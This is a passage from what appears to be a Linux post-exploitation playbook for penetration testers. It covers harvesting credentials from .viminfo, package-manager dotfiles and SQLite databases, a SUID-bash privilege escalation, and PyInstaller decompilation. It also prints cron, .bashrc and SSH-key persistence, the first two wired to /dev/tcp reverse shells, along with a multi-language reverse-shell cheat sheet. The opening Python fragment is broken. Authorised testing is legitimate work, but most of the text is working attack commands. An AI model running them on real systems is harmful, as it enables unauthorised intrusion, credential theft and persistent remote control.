import socket, struct
# MongoDB wire protocol — send isMaster command
s = socket.socket()
s.connect(('127.0.0.1', 27017))
msg = b'\x3f\x00\x00\x00'  # message length
msg += b'\x01\x00\x00\x00'  # requestID
msg += b'\x00\x00\x00\x00'  # responseTo
msg += b'\xd4\x07\x00\x00'  # opCode: OP_QUERY
msg += b'\x00\x00\x00\x00'  # flags
msg += b'admin.\$cmd\x00'   # collection
msg += b'\x00\x00\x00\x00'  # skip
msg += b'\x01\x00\x00\x00'  # return
# Minimal isMaster BSON document
import bson  # may not be available — fallback to mongo client
"
# Realistically: if MongoDB is installed, the mongo shell is the LOTL tool
```

### 5.1k Recovering Secrets from ~/.viminfo (Registers, File Marks, Search History)

Vim stores command history, search patterns, yanked text (registers), and file marks in `~/.viminfo`. Administrators who edit sensitive files leave credential fragments in registers and the file-mark history reveals which config files they accessed.

```bash
# Find all viminfo files
find / -name ".viminfo" 2>/dev/null
ls -la /home/*/.viminfo /root/.viminfo 2>/dev/null

# Dump registers (yanked/deleted text — may contain passwords pasted into configs)
grep -A5 "^\"" /root/.viminfo 2>/dev/null
grep -A5 "^\"" /home/*/.viminfo 2>/dev/null

# Search for high-value patterns in register contents
grep -iE "password|secret|token|key|api|BEGIN.*PRIVATE" /root/.viminfo 2>/dev/null
grep -iE "password|secret|token|key|api|BEGIN.*PRIVATE" /home/*/.viminfo 2>/dev/null
```

```bash
# Command-line history — shows what commands were run in vim
grep "^:" /root/.viminfo 2>/dev/null | head -50
# Look for: :r !cat /etc/shadow, :w /tmp/creds, :%s/oldpass/newpass/g

# Search history — reveals what was searched for (grep patterns)
grep "^/" /root/.viminfo 2>/dev/null | head -20
grep "^?" /root/.viminfo 2>/dev/null | head -20

# File marks — shows recently edited files (high-value targets)
grep "^>" /root/.viminfo 2>/dev/null | head -20
# Example: > ~/.ssh/config, > /etc/openvpn/auth.txt, > /opt/app/.env

# Named registers (a-z) — explicitly yanked text
sed -n '/^"[a-z]/,/^$/p' /root/.viminfo 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# Only cat/grep needed — viminfo is a plain text file
# One-liner to extract all register contents and high-value strings:
for f in /home/*/.viminfo /root/.viminfo; do
  [ -r "$f" ] && echo "=== $f ===" && grep -iE "password|secret|token|BEGIN|key=" "$f"
done
```

### 5.1l Package-Manager Dotfile Credential Discovery

Package-manager auth tokens live in dotfiles that persist after `npm publish`, `pip upload`, `gem push`, etc. A sweep of home directories reveals tokens for PyPI, npm, RubyGems, Cargo, Composer, Maven, and Gradle registries.

```bash
# One-shot sweep of all package-manager credential dotfiles
for home in /home/* /root; do
  for f in .npmrc .yarnrc .pypirc .netrc .gem/credentials .bundle/config \
           .cargo/credentials .cargo/credentials.toml .composer/auth.json \
           .m2/settings.xml .gradle/gradle.properties .docker/config.json \
           .config/pip/pip.conf; do
    [ -r "$home/$f" ] && echo "[+] $home/$f" && cat "$home/$f"
  done
done 2>/dev/null
```

```bash
# What tokens look like in each file:

# .npmrc — //registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXX
grep -i "authToken\|_auth\|registry" /home/*/.npmrc /root/.npmrc 2>/dev/null

# .pypirc — password = pypi-XXXXXXXXXXXX (or plaintext password)
grep -iE "password|token|username" /home/*/.pypirc /root/.pypirc 2>/dev/null

# .netrc — machine <host> login <user> password <pass>
cat /home/*/.netrc /root/.netrc 2>/dev/null

# .gem/credentials — :rubygems_api_key: rubygems_XXXX
cat /home/*/.gem/credentials /root/.gem/credentials 2>/dev/null

# .bundle/config — BUNDLE_ENTERPRISE__CONTRIBSYS__COM: "user:pass"
cat /home/*/.bundle/config /root/.bundle/config 2>/dev/null

# .cargo/credentials[.toml] — token = "cio_XXXXX"
cat /home/*/.cargo/credentials /home/*/.cargo/credentials.toml 2>/dev/null

# .composer/auth.json — {"http-basic": {"repo.packagist.com": {"username":"x","password":"y"}}}
cat /home/*/.composer/auth.json /root/.composer/auth.json 2>/dev/null

# .m2/settings.xml — <password>PLAINTEXT_OR_ENCRYPTED</password>
grep -iE "password|passphrase" /home/*/.m2/settings.xml /root/.m2/settings.xml 2>/dev/null

# .gradle/gradle.properties — mavenUser=x / mavenPassword=y / signing.password=z
grep -iE "password|token|key" /home/*/.gradle/gradle.properties /root/.gradle/gradle.properties 2>/dev/null

# .docker/config.json — {"auths":{"registry":{"auth":"base64(user:pass)"}}}
cat /home/*/.docker/config.json /root/.docker/config.json 2>/dev/null | grep -i auth
# Decode docker auth: echo "<BASE64>" | base64 -d
```

#### Living-off-the-land / LOTL variant

```bash
# Pure cat/grep/for loop — fully LOTL, no tools needed
# The one-shot sweep above works with only bash builtins + cat
# Decode base64 docker auth without external tools:
# echo "<TOKEN>" | base64 -d (base64 is coreutils)
```

### 5.1m Post-Exploitation SQLite Database Enumeration and Abuse

SQLite databases (`.db`, `.sqlite`, `.sqlite3`) are ubiquitous for application state, local auth stores, browser profiles, and internal APIs. After gaining access, enumerate all SQLite files, dump credential tables, and check for writable task/job databases that enable privilege escalation.

```bash
# Find all SQLite databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.sqlitedb" 2>/dev/null | head -30
# Common locations:
ls -la /var/www/*/db.sqlite3 /opt/*/data/*.db /var/lib/*/*.sqlite 2>/dev/null

# Verify it's SQLite (file magic)
file <DATABASE_PATH>
```

```bash
# Enumerate tables and schema
sqlite3 <DATABASE_PATH> ".tables"
sqlite3 <DATABASE_PATH> ".schema"

# Dump credential-bearing tables
sqlite3 <DATABASE_PATH> "SELECT * FROM users;" 2>/dev/null
sqlite3 <DATABASE_PATH> "SELECT * FROM accounts;" 2>/dev/null
sqlite3 <DATABASE_PATH> "SELECT * FROM auth_user;" 2>/dev/null   # Django default
sqlite3 <DATABASE_PATH> "SELECT * FROM credentials;" 2>/dev/null
sqlite3 <DATABASE_PATH> "SELECT * FROM sessions;" 2>/dev/null
sqlite3 <DATABASE_PATH> "SELECT * FROM tokens;" 2>/dev/null

# Generic credential hunt across all tables
sqlite3 <DATABASE_PATH> <<'SQL'
.headers on
.mode column
SELECT name FROM sqlite_master WHERE type='table';
SQL

# Dump all tables with password-like columns
sqlite3 <DATABASE_PATH> "SELECT sql FROM sqlite_master WHERE sql LIKE '%pass%' OR sql LIKE '%secret%' OR sql LIKE '%token%';"
```

```bash
# Privesc via writable task/job SQLite database
# If a root-executed scheduler reads jobs from a writable SQLite DB:
sqlite3 <JOB_DB_PATH> "INSERT INTO jobs (command, schedule) VALUES ('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash', '* * * * *');"

# Browser credential databases (see 5.1h for decryption):
find / -name "Login Data" -o -name "key4.db" -o -name "logins.json" 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# sqlite3 ships with most Linux distributions (part of sqlite package)
which sqlite3 2>/dev/null
# If sqlite3 unavailable, python3 can access SQLite:
python3 -c "
import sqlite3, sys
conn = sqlite3.connect('<DATABASE_PATH>')
c = conn.cursor()
for table in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\").fetchall():
    print(f'\\n=== {table[0]} ===')
    for row in c.execute(f'SELECT * FROM {table[0]} LIMIT 10'):
        print(row)
"
```

### 5.1n PyInstaller Binary Extraction and .pyc Decompilation

When encountering a frozen Python ELF (PyInstaller, cx_Freeze, Nuitka), extract the embedded `.pyc` files and decompile them to recover source code — reveals hardcoded credentials, API keys, encryption routines, and application logic.

```bash
# Detect — identify PyInstaller binaries
file <BINARY_PATH>     # "ELF ... (Python)" or large static binary
strings <BINARY_PATH> | grep -i "pyinstaller\|PYZ\|_MEI\|_MEIPASS"
# PyInstaller binaries contain "MEI" magic and "PYZ" archive marker
```

```bash
# Method 1: pyinstxtractor (Python-based — runs on target if python3 available)
# Extract the PYZ archive and all embedded .pyc files
python3 pyinstxtractor.py <BINARY_PATH>
# Output: <BINARY_PATH>_extracted/ containing .pyc files and PYZ-00.pyz_extracted/

# Method 2: Manual extraction (if pyinstxtractor not available)
# PyInstaller appends a MAGIC trailer to the binary — find the TOC offset
strings <BINARY_PATH> | grep -c "PYZ"
# The archive starts at the end of the ELF — extract with dd/binwalk
binwalk -e <BINARY_PATH>
```

```bash
# Decompile .pyc to readable Python source
# pycdc (C++ based — most reliable for Python 3.9+)
pycdc <EXTRACTED_DIR>/<MAIN_MODULE>.pyc

# uncompyle6 (Python 3.0-3.8)
uncompyle6 <EXTRACTED_DIR>/<MAIN_MODULE>.pyc > recovered_source.py

# decompyle3 (Python 3.7-3.9)
decompyle3 <EXTRACTED_DIR>/<MAIN_MODULE>.pyc > recovered_source.py

# After decompilation — hunt for secrets
grep -riE "password|secret|api_key|token|encrypt|decrypt|key=" recovered_source.py
```

```bash
# Fix magic header mismatch (common when pyc version differs)
# Get the correct magic number for the target Python version:
python3 -c "import importlib.util; print(importlib.util.MAGIC_NUMBER.hex())"
# Prepend correct magic + 12 null bytes (timestamp + size) if header is corrupted:
printf '\x<MAGIC_BYTES>\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
  cat - <STRIPPED_PYC> > /tmp/fixed.pyc
```

#### Living-off-the-land / LOTL variant

```bash
# If only python3 is available on target (no pyinstxtractor/decompilers):
# Extract using Python's zipimport (PyInstaller PYZ is a modified ZIP)
python3 -c "
import zipfile, sys
try:
    z = zipfile.ZipFile('<BINARY_PATH>')
    z.extractall('/tmp/pyextract')
    print('[+] Extracted as zip')
except:
    print('[-] Not directly zip-extractable — need pyinstxtractor')
"
# Decompilation must happen offline (transfer .pyc to attacker box)
# On target: extract .pyc files; on attacker: run pycdc/uncompyle6
```

---

### 5.2 Persistence

> **🛑 Engagement RoE Check — Persistence is restricted by default**
>
> Persistence primitives below should fire ONLY when the engagement explicitly validates persistence (Purple Team detection-engineering, red-team RoE that requests persistence simulation). For all other work — bug-bounty PoC, vendor coordinated disclosure, standard pentest — use the **additive-only marker convention** instead:
>
> - **Don't:** create a new cron job, systemd unit, .bashrc append, .profile append, ld.so.preload entry, motd hook, or kernel module as proof you got root/uid=0.
> - **Do:** drop a uniquely-named marker file in a location only that privilege can write (`/root/marker-engagement-<engagement-id>-<ts>.txt`, `/home/<user>/marker-engagement-<engagement-id>-<ts>.txt` for lateral). The location proves the privilege; the file is removable; no persistent execution.
> - For SSH-key / `authorized_keys` / `.bashrc` / `.profile` / `/etc/sudoers` / `/etc/passwd` / `/etc/shadow` — these are **persistence vectors**: prove with a `cat`-and-screenshot read, never by appending. Reading `/etc/shadow` as uid=0 already proves the privilege.
>
> When persistence IS validated by the engagement scope, follow the rules below:
> - Use a **marker name** (e.g. cron line containing `engagement-test-<ts>`, systemd unit `engagement-test-<ts>.service`).
> - Make it **easily removable** — no obfuscated names, no encrypted bodies.
> - **Coordinate** with the detection team before firing (so they can confirm telemetry).
> - **Remove at end of engagement** — track in your cleanup checklist (see `pentest-process.md` Phase 6 cleanup).
>
> Reference: User's offsec engagement rules §5 (additive-only proof-of-access).

```bash
# SSH key persistence — only with persistence-validation RoE; otherwise prove root with `cat /root/.ssh/id_rsa` + `id` instead.
mkdir -p /root/.ssh
echo '<PUB_KEY> engagement-test-<TS>' >> /root/.ssh/authorized_keys     # marker comment in key — remove at end of engagement
chmod 600 /root/.ssh/authorized_keys

# Cron persistence — engagement-test-<TS>, remove at end of engagement
# 🔴 alert-likely + persistence vector — new crontab entry triggers auditd PATH/CONFIG_CHANGE, falco "Schedule Cron Jobs" rule, EDR persistence-monitor; the embedded /dev/tcp reverse shell adds a second alert (network IOC). Engagement-validation only — disclosure work uses read-only proof of "I could write to crontab" via `ls -la /var/spool/cron/`.
(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"  # engagement-test-<TS> — remove at end of engagement') | crontab -

# SUID shell — drop in marker-named path; not real persistence (no scheduler), but creates a privilege backdoor — engagement-validate first.
cp /bin/bash /tmp/engagement-test-<TS>-bash
chmod +s /tmp/engagement-test-<TS>-bash
# Access: /tmp/engagement-test-<TS>-bash -p

# .bashrc persistence — engagement-validate first; otherwise read .bashrc as proof, don't append.
# Marker comment for easy git-diff cleanup.
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1 &  # engagement-test-<TS>' >> /home/<USER>/.bashrc

# Systemd unit persistence — marker-named unit file, remove at end of engagement
# /etc/systemd/system/engagement-test-<TS>.service
# systemctl daemon-reload && systemctl enable --now engagement-test-<TS>.service
```

> **After credential harvesting — next steps:**
> - Test every found credential against all live hosts: `netexec ssh/smb/winrm <SUBNET>/24 -u <USER> -p <PASS>`
> - Found a new subnet / dual-homed host? → [Tunneling & Pivoting](tunneling-pivoting.md)
> - Target is domain-joined and you have creds? → [Active Directory Methodology — Phase 2](active-directory-methodology.md) Phase 2
> - Need to transfer files or tools? → [File Transfer Techniques](file-transfers.md)

[Back to top](#table-of-contents)

---

## Quick Reference: Post-Foothold Checklist

```text
Got a shell on Linux? Run through this in order:

1. WHO AM I?
   id && whoami && hostname
   └→ Note user, groups, hostname for your notes

2. QUICK WINS — check these first (< 2 minutes)
   sudo -l                          → GTFOBins? LD_PRELOAD?
   cat /etc/doas.conf 2>/dev/null   → doas permissions?
   ls -la /etc/passwd /etc/shadow   → writable?
   find / -perm -4000 2>/dev/null   → SUID binaries → GTFOBins?
   getcap -r / 2>/dev/null          → cap_setuid? cap_dac_read_search?

3. SYSTEM CONTEXT
   uname -a && cat /etc/os-release  → kernel exploits? (PwnKit, DirtyCow, DirtyPipe)
   ip a && route -n                 → dual-homed? → pivot! (tunneling-pivoting.md)
   ss -tulnp                        → internal services on 127.0.0.1?

4. CRON & TIMERS
   cat /etc/crontab && ls -la /etc/cron* → writable scripts? wildcard injection?
   systemctl list-timers             → writable service files?

5. CREDENTIALS
   cat /home/*/.bash_history         → passwords in history?
   grep -ri 'password\|pass=' /var/www/ /opt/ /etc/ 2>/dev/null
   find / -name '*.bak' -o -name '*.conf' -o -name '.env' 2>/dev/null
   ls -la /home/*/.ssh/              → SSH keys to reuse?

6. AUTOMATED SCAN
   ./linpeas.sh | tee linpeas.txt   → review output for anything missed
   ./pspy64                          → watch for root cron jobs

7. STILL STUCK?
   Check groups: id → disk? docker? lxd? adm? (see 4.12b)
   Check /opt/ and /var/backups/ for custom apps or scripts
   Re-read linpeas output — look for yellow/red highlights
   Try kernel exploits: ./linux-exploit-suggester.sh
```

---

## Quick Reference: Privilege Escalation Decision Tree

```text
sudo -l
├── Binary listed? → https://gtfobins.github.io/ (search binary name)
├── LD_PRELOAD in env_keep? → compile malicious .so (see 4.1)
├── (ALL) NOPASSWD? → sudo su / sudo bash
└── Nothing useful? ↓

find / -perm -4000 2>/dev/null
├── Custom/unusual SUID binary? → strings + ltrace + strace (see 4.2)
├── Known binary? → GTFOBins SUID filter
└── Nothing useful? ↓

getcap -r / 2>/dev/null
├── cap_setuid on python/perl/node? → setuid(0) + shell (see 4.3)
└── Nothing useful? ↓

cat /etc/crontab + pspy
├── Writable script run by root? → inject payload (see 4.4)
├── Wildcard in tar/rsync command? → checkpoint injection (see 4.4)
├── Relative path in cron command? → PATH hijack (see 4.12)
└── Nothing useful? ↓

Check groups (id)
├── docker/lxd → instant root (see 4.11)
├── disk → debugfs /dev/sda1 (see 4.12b)
├── shadow → cat /etc/shadow (see 4.12b)
└── Nothing useful? ↓

Kernel / system
├── ls -la /usr/bin/pkexec → PwnKit CVE-2021-4034 (see 4.7)
├── sudo --version → Baron Samedit CVE-2021-3156 (see 4.7)
├── uname -r → DirtyPipe, DirtyCow, GameOverlay (see 4.7)
└── ./linux-exploit-suggester.sh
```

---

## Quick Reference: Reverse Shells

> Generate reverse shells for any language/platform: [https://www.revshells.com](https://www.revshells.com)
> Unix binary exploitation / shell escapes: [https://gtfobins.github.io](https://gtfobins.github.io)
> Supplementary reference: [https://book.hacktricks.wiki](https://book.hacktricks.wiki)

```bash
# Bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$s=fsockopen("<ATTACKER_IP>",<ATTACKER_PORT>);exec("/bin/bash <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# Netcat (with -e)
nc -e /bin/bash <ATTACKER_IP> <ATTACKER_PORT>

# Netcat (without -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <ATTACKER_PORT> > /tmp/f

# PowerShell (on Linux)
pwsh -c '$c=New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<ATTACKER_PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length)}'
```

## Quick Reference: Shell Stabilization

```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows <ROWS> cols <COLS>

# Script method
script -qc /bin/bash /dev/null
# Then Ctrl+Z → stty raw -echo; fg

# rlwrap (for non-interactive shells)
rlwrap nc -lvnp <PORT>
```
